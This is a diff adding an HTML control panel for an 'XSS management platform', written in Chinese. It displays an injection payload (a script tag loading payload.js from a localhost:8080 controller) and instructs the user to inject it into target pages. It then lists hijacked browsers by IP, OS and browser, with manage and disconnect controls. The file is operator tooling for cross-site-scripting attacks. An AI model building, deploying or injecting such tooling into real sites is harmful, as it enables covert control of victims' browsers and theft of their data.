@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS 管理平台</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .header {
+            background: white;
+            padding: 1rem 2rem;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #4a6cf7;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo::before {
+            content: "🛡️";
+            font-size: 1.2rem;
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .stats {
+            display: flex;
+            gap: 1.5rem;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .stat-value {
+            font-weight: 600;
+            color: #4a6cf7;
+        }
+
+        .btn {
+            padding: 0.5rem 1rem;
+            border: none;
+            border-radius: 6px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .btn-primary {
+            background: #4a6cf7;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #3a5ce5;
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: #f0f2f5;
+            color: #4a6cf7;
+            border: 1px solid #e0e4e8;
+        }
+
+        .btn-secondary:hover {
+            background: #e0e4e8;
+        }
+
+        .btn-danger {
+            background: #ff6b6b;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #ff5252;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .section {
+            background: white;
+            border-radius: 10px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .payload-section {
+            background: linear-gradient(135deg, #4a6cf7 0%, #3a5ce5 100%);
+            color: white;
+        }
+
+        .payload-section .section-title {
+            color: white;
+        }
+
+        .payload-code {
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 6px;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+            margin: 1rem 0;
+            color: #fff;
+        }
+
+        /* 客户端表格样式 */
+        .clients-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .clients-table th {
+            background: #f8f9fa;
+            padding: 1rem;
+            text-align: center;
+            font-weight: 600;
+            color: #333;
+            border-bottom: 1px solid #e0e4e8;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+        }
+
+        .clients-table th:hover {
+            background: #f0f2f5;
+        }
+
+        .clients-table th.sorted-asc::after {
+            content: "▲";
+            position: absolute;
+            right: 10px;
+            color: #4a6cf7;
+        }
+
+        .clients-table th.sorted-desc::after {
+            content: "▼";
+            position: absolute;
+            right: 10px;
+            color: #4a6cf7;
+        }
+
+        .clients-table td {
+            padding: 1rem;
+            border-bottom: 1px solid #f0f0f0;
+            vertical-align: middle;
+        }
+
+        .clients-table tr:last-child td {
+            border-bottom: none;
+        }
+
+        .clients-table tr:hover {
+            background: #f9f9f9;
+        }
+
+        .client-id {
+            font-family: 'Courier New', monospace;
+            font-weight: 600;
+            color: #4a6cf7;
+            min-width: 180px;
+        }
+
+        .client-detail {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .detail-label {
+            font-size: 0.8rem;
+            color: #888;
+            display: none; /* 隐藏标签，因为已经有表头 */
+        }
+
+        .detail-value {
+            font-size: 0.9rem;
+        }
+
+        .client-actions {
+            display: flex;
+            gap: 0.5rem;
+            justify-content: flex-end;
+        }
+
+        .client-status {
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .status-online {
+            background: #e6f7e6;
+            color: #28a745;
+            border: 1px solid #c3e6cb;
+        }
+
+        .client-actions {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 3rem 1rem;
+            color: #888;
+            background: #f9f9f9;
+            border-radius: 8px;
+            border: 1px dashed #e0e4e8;
+        }
+
+        .empty-state-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            opacity: 0.5;
+        }
+
+        .empty-state-text {
+            font-size: 1.1rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .empty-state-subtext {
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+
+        .refresh-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-size: 0.8rem;
+            color: #666;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .refresh-indicator.show {
+            opacity: 1;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .spinning {
+            animation: spin 1s linear infinite;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                gap: 1rem;
+            }
+            
+            .stats {
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+            
+            .client-info {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.5rem;
+            }
+            
+            .client-details {
+                flex-direction: column;
+                gap: 0.5rem;
+            }
+            
+            .client-row {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 1rem;
+            }
+            
+            .client-actions {
+                width: 100%;
+            }
+            
+            .client-actions button {
+                flex: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">XSS 管理平台</div>
+            <div class="header-actions">
+                <div class="stats">
+                    <div class="stat-item">
+                        <span>在线客户端</span>
+                        <span class="stat-value" id="clientCount">0</span>
+                    </div>
+                    <div class="stat-item">
+                        <span>运行时间</span>
+                        <span class="stat-value" id="uptime">--</span>
+                    </div>
+                </div>
+                <div class="refresh-indicator" id="refreshIndicator">
+                    <span>🔄</span>
+                    <span>更新中...</span>
+                </div>
+                <button class="btn btn-secondary" onclick="refreshClients()">
+                    <span>🔄</span>
+                    刷新
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="section payload-section">
+            <div class="section-header">
+                <h2 class="section-title">
+                    <span>⚡</span>
+                    Payload 代码
+                </h2>
+                <button class="btn btn-secondary" onclick="copyPayload()">
+                    <span>📋</span>
+                    复制代码
+                </button>
+            </div>
+            <div class="payload-code" id="payloadCode">
+                &lt;script src="http://localhost:8080/payload.js"&gt;&lt;/script&gt;
+            </div>
+            <p style="opacity: 0.9; font-size: 0.9rem; margin-top: 1rem;">
+                将上述代码注入到目标页面即可建立连接。客户端将自动连接到控制台。
+            </p>
+        </div>
+
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">
+                    <span>👥</span>
+                    在线客户端
+                </h2>
+                <div style="display: flex; gap: 1rem; align-items: center;">
+                    <span style="font-size: 0.9rem; color: #666;">自动刷新: 2秒</span>
+                </div>
+            </div>
+            <div id="clientsList">
+                <table class="clients-table" id="clientsTable" style="display: none;">
+                    <thead>
+                        <tr>
+                            <th data-sort="id">客户端ID</th>
+                            <th data-sort="ip">IP地址</th>
+                            <th data-sort="onlineAt">上线时间</th>
+                            <th data-sort="lastSeen">最后活跃</th>
+                            <th data-sort="os">操作系统</th>
+                            <th data-sort="browser">浏览器</th>
+                            <th data-sort="status">状态</th>
+                            <th>操作</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <!-- 客户端行将动态生成 -->
+                    </tbody>
+                </table>
+                <div class="empty-state" id="emptyState">
+                    <div class="empty-state-icon">🔍</div>
+                    <div class="empty-state-text">暂无在线客户端</div>
+                    <div class="empty-state-subtext">等待客户端连接...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let startTime = Date.now();
+
+        // 更新运行时间
+        function updateUptime() {
+            const now = Date.now();
+            const diff = Math.floor((now - startTime) / 1000);
+            const hours = Math.floor(diff / 3600);
+            const minutes = Math.floor((diff % 3600) / 60);
+            const seconds = diff % 60;
+            
+            let uptime = '';
+            if (hours > 0) uptime += hours + '时';
+            if (minutes > 0) uptime += minutes + '分';
+            uptime += seconds + '秒';
+            
+            document.getElementById('uptime').textContent = uptime;
+        }
+
+        // 复制 Payload
+        function copyPayload() {
+            const payloadText = '<script src="http://localhost:8080/payload.js"><\/script>';
+            navigator.clipboard.writeText(payloadText).then(() => {
+                const btn = event.target.closest('button');
+                const originalText = btn.innerHTML;
+                btn.innerHTML = '<span>✅</span>已复制';
+                setTimeout(() => {
+                    btn.innerHTML = originalText;
+                }, 2000);
+            });
+        }
+
+        // 刷新客户端列表
+        async function refreshClients() {
+            const indicator = document.getElementById('refreshIndicator');
+            indicator.classList.add('show');
+            indicator.querySelector('span').classList.add('spinning');
+            
+            try {
+                await loadClients();
+            } finally {
+                setTimeout(() => {
+                    indicator.classList.remove('show');
+                    indicator.querySelector('span').classList.remove('spinning');
+                }, 500);
+            }
+        }
+
+        // 全局变量
+        let clients = [];
+        let currentSort = { column: 'lastSeen', direction: 'desc' };
+        
+        // 解析用户代理字符串，提取操作系统和浏览器信息
+        function parseUserAgent(userAgent) {
+            if (!userAgent) return { os: '未知', browser: '未知' };
+            
+            // 操作系统检测
+            let os = '未知';
+            if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10';
+            else if (userAgent.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
+            else if (userAgent.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
+            else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
+            else if (userAgent.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista';
+            else if (userAgent.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP';
+            else if (userAgent.indexOf('Windows NT') !== -1) os = 'Windows NT';
+            else if (userAgent.indexOf('Mac OS X') !== -1) {
+                const macOSVersion = userAgent.match(/Mac OS X ([0-9_]+)/);
+                if (macOSVersion && macOSVersion[1]) {
+                    const version = macOSVersion[1].replace(/_/g, '.');
+                    os = 'macOS ' + version;
+                } else {
+                    os = 'macOS';
+                }
+            }
+            else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS';
+            else if (userAgent.indexOf('iPad') !== -1) os = 'iPadOS';
+            else if (userAgent.indexOf('Android') !== -1) {
+                const androidVersion = userAgent.match(/Android ([0-9\.]+)/);
+                if (androidVersion && androidVersion[1]) {
+                    os = 'Android ' + androidVersion[1];
+                } else {
+                    os = 'Android';
+                }
+            }
+            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
+            else if (userAgent.indexOf('CentOS') !== -1) os = 'CentOS';
+            else if (userAgent.indexOf('Ubuntu') !== -1) os = 'Ubuntu';
+            
+            // 浏览器检测 - 中国特色浏览器优先检测
+            let browser = '未知';
+            
+            // 搜狗浏览器
+            if (userAgent.indexOf('SE') !== -1 && userAgent.indexOf('MetaSr') !== -1) {
+                browser = '搜狗浏览器';
+            }
+            // QQ浏览器
+            else if (userAgent.indexOf('QQBrowser') !== -1) {
+                const qqVersion = userAgent.match(/QQBrowser\/([0-9\.]+)/);
+                if (qqVersion && qqVersion[1]) {
+                    browser = 'QQ浏览器 ' + qqVersion[1];
+                } else {
+                    browser = 'QQ浏览器';
+                }
+            }
+            // 微信内置浏览器
+            else if (userAgent.indexOf('MicroMessenger') !== -1) {
+                const wxVersion = userAgent.match(/MicroMessenger\/([0-9\.]+)/);
+                if (wxVersion && wxVersion[1]) {
+                    browser = '微信 ' + wxVersion[1];
+                } else {
+                    browser = '微信';
+                }
+            }
+            // UC浏览器
+            else if (userAgent.indexOf('UCBrowser') !== -1) {
+                const ucVersion = userAgent.match(/UCBrowser\/([0-9\.]+)/);
+                if (ucVersion && ucVersion[1]) {
+                    browser = 'UC浏览器 ' + ucVersion[1];
+                } else {
+                    browser = 'UC浏览器';
+                }
+            }
+            // 百度浏览器
+            else if (userAgent.indexOf('Baidu') !== -1 || userAgent.indexOf('BIDUBrowser') !== -1) {
+                browser = '百度浏览器';
+            }
+            // 360浏览器
+            else if (userAgent.indexOf('360EE') !== -1 || userAgent.indexOf('360SE') !== -1) {
+                browser = '360浏览器';
+            }
+            // 猎豹浏览器
+            else if (userAgent.indexOf('LBBROWSER') !== -1) {
+                browser = '猎豹浏览器';
+            }
+            // 华为浏览器
+            else if (userAgent.indexOf('HuaweiBrowser') !== -1) {
+                browser = '华为浏览器';
+            }
+            // OPPO浏览器
+            else if (userAgent.indexOf('HeyTapBrowser') !== -1) {
+                browser = 'OPPO浏览器';
+            }
+            // vivo浏览器
+            else if (userAgent.indexOf('VivoBrowser') !== -1) {
+                browser = 'vivo浏览器';
+            }
+            // 小米浏览器
+            else if (userAgent.indexOf('MiuiBrowser') !== -1) {
+                browser = '小米浏览器';
+            }
+            // 夸克浏览器
+            else if (userAgent.indexOf('Quark') !== -1) {
+                browser = '夸克浏览器';
+            }
+            // 国际浏览器
+            else if (userAgent.indexOf('Edge') !== -1 || userAgent.indexOf('Edg/') !== -1) {
+                const edgeVersion = userAgent.match(/Edg\/([0-9\.]+)/);
+                if (edgeVersion && edgeVersion[1]) {
+                    browser = 'Edge ' + edgeVersion[1];
+                } else {
+                    browser = 'Edge';
+                }
+            }
+            else if (userAgent.indexOf('Chrome') !== -1) {
+                const chromeVersion = userAgent.match(/Chrome\/([0-9\.]+)/);
+                if (chromeVersion && chromeVersion[1]) {
+                    browser = 'Chrome ' + chromeVersion[1];
+                } else {
+                    browser = 'Chrome';
+                }
+            }
+            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) {
+                const safariVersion = userAgent.match(/Safari\/([0-9\.]+)/);
+                if (safariVersion && safariVersion[1]) {
+                    browser = 'Safari ' + safariVersion[1];
+                } else {
+                    browser = 'Safari';
+                }
+            }
+            else if (userAgent.indexOf('Firefox') !== -1) {
+                const firefoxVersion = userAgent.match(/Firefox\/([0-9\.]+)/);
+                if (firefoxVersion && firefoxVersion[1]) {
+                    browser = 'Firefox ' + firefoxVersion[1];
+                } else {
+                    browser = 'Firefox';
+                }
+            }
+            else if (userAgent.indexOf('MSIE') !== -1 || userAgent.indexOf('Trident/') !== -1) {
+                const ieVersion = userAgent.match(/MSIE ([0-9\.]+)/);
+                if (ieVersion && ieVersion[1]) {
+                    browser = 'IE ' + ieVersion[1];
+                } else {
+                    browser = 'IE';
+                }
+            }
+            
+            return { os, browser };
+        }
+
+        // 加载客户端列表
+        async function loadClients() {
+            try {
+                const response = await fetch('/api/clients');
+                if (!response.ok) throw new Error('Network response was not ok');
+                
+                clients = await response.json();
+                const countElement = document.getElementById('clientCount');
+                const clientsTable = document.getElementById('clientsTable');
+                const emptyState = document.getElementById('emptyState');
+                
+                countElement.textContent = clients.length;
+                
+                if (clients.length === 0) {
+                    clientsTable.style.display = 'none';
+                    emptyState.style.display = 'block';
+                    return;
+                }
+
+                // 显示表格，隐藏空状态
+                clientsTable.style.display = 'table';
+                emptyState.style.display = 'none';
+
+                // 排序客户端
+                sortClients(currentSort.column, currentSort.direction);
+                
+            } catch (error) {
+                console.error('Failed to load clients:', error);
+                const clientsTable = document.getElementById('clientsTable');
+                const emptyState = document.getElementById('emptyState');
+                
+                clientsTable.style.display = 'none';
+                emptyState.style.display = 'block';
+                emptyState.innerHTML = '<div class="empty-state-icon">🔍</div>' +
+                    '<div class="empty-state-text">暂无会话</div>' +
+                    '<div class="empty-state-subtext">等待客户端连接...</div>';
+            }
+        }
+
+        // 排序客户端
+        function sortClients(column, direction) {
+            // 保存当前排序状态
+            currentSort.column = column;
+            currentSort.direction = direction;
+            
+            // 更新表头样式
+            const headers = document.querySelectorAll('#clientsTable th');
+            headers.forEach(header => {
+                header.classList.remove('sorted-asc', 'sorted-desc');
+                if (header.getAttribute('data-sort') === column) {
+                    header.classList.add(direction === 'asc' ? 'sorted-asc' : 'sorted-desc');
+                }
+            });
+            
+            // 排序客户端数组
+            clients.sort((a, b) => {
+                let valueA, valueB;
+                
+                switch (column) {
+                    case 'id':
+                        valueA = a.id;
+                        valueB = b.id;
+                        break;
+                    case 'ip':
+                        valueA = a.ip;
+                        valueB = b.ip;
+                        break;
+                    case 'onlineAt':
+                        valueA = new Date(a.onlineAt).getTime();
+                        valueB = new Date(b.onlineAt).getTime();
+                        break;
+                    case 'lastSeen':
+                        valueA = new Date(a.lastSeen).getTime();
+                        valueB = new Date(b.lastSeen).getTime();
+                        break;
+                    case 'os':
+                        valueA = parseUserAgent(a.userAgent).os;
+                        valueB = parseUserAgent(b.userAgent).os;
+                        break;
+                    case 'browser':
+                        valueA = parseUserAgent(a.userAgent).browser;
+                        valueB = parseUserAgent(b.userAgent).browser;
+                        break;
+                    default:
+                        valueA = a.id;
+                        valueB = b.id;
+                }
+                
+                if (direction === 'asc') {
+                    return valueA > valueB ? 1 : -1;
+                } else {
+                    return valueA < valueB ? 1 : -1;
+                }
+            });
+            
+            // 渲染排序后的客户端
+            renderClients();
+        }
+
+        // 简化客户端ID显示
+        function simplifyClientId(id) {
+            // 如果ID格式为 client_timestamp，则提取后6位数字
+            if (id && id.startsWith('client_')) {
+                const numPart = id.substring(7); // 去掉 "client_" 前缀
+                if (numPart.length > 6) {
+                    return '客户端_' + numPart.substring(numPart.length - 6);
+                }
+            }
+            return id;
+        }
+
+        // 渲染客户端表格
+        function renderClients() {
+            const tbody = document.querySelector('#clientsTable tbody');
+            
+            tbody.innerHTML = clients.map(client => {
+                // 优先显示公网IP
+                const ipAddress = client.publicIP || client.ip || '未知';
+                
+                // 解析用户代理
+                const { os, browser } = parseUserAgent(client.userAgent);
+                
+                // 简化客户端ID显示
+                const simplifiedId = simplifyClientId(client.id);
+                
+                return `<tr>
+                    <td class="client-id" title="${client.id}">${simplifiedId}</td>
+                    <td>${ipAddress}</td>
+                    <td>${new Date(client.onlineAt).toLocaleString()}</td>
+                    <td>${new Date(client.lastSeen).toLocaleString()}</td>
+                    <td title="${os}">${os}</td>
+                    <td title="${browser}">${browser}</td>
+                    <td><div class="client-status status-online">在线</div></td>
+                    <td>
+                        <div class="client-actions">
+                            <button class="btn btn-primary" onclick="openClient('${client.id}')">
+                                <span>⚙️</span>管理
+                            </button>
+                            <button class="btn btn-danger" onclick="disconnectClient('${client.id}')" title="断开连接">
+                                <span>❌</span>断开
+                            </button>
+                        </div>
+                    </td>
+                </tr>`;
+            }).join('');
+        }
+
+        // 打开客户端管理页面
+        function openClient(clientId) {
+            window.open('/client/' + clientId, '_blank');
+        }
+
+        // 断开客户端连接
+        async function disconnectClient(clientId) {
+            if (!confirm('确定要断开此客户端连接吗？')) return;
+            
+            try {
+                const disconnectResponse = await fetch('/api/client/' + clientId + '/disconnect', {
+                    method: 'POST'
+                });
+                
+                if (disconnectResponse.ok) {
+                    await loadClients();
+                } else {
+                    alert('断开连接失败');
+                }
+            } catch (error) {
+                alert('操作失败: ' + error.message);
+            }
+        }
+
+        // 初始化
+        document.addEventListener('DOMContentLoaded', () => {
+            // 添加表头排序事件
+            const headers = document.querySelectorAll('#clientsTable th[data-sort]');
+            headers.forEach(header => {
+                header.addEventListener('click', () => {
+                    const column = header.getAttribute('data-sort');
+                    // 如果点击当前排序列，则切换排序方向
+                    const direction = (column === currentSort.column && currentSort.direction === 'asc') ? 'desc' : 'asc';
+                    sortClients(column, direction);
+                });
+            });
+            
+            loadClients();
+            setInterval(loadClients, 2000); // 每2秒刷新
+            setInterval(updateUptime, 1000); // 每秒更新运行时间
+            updateUptime();
+        });
+    </script>
+</body>
+</html>
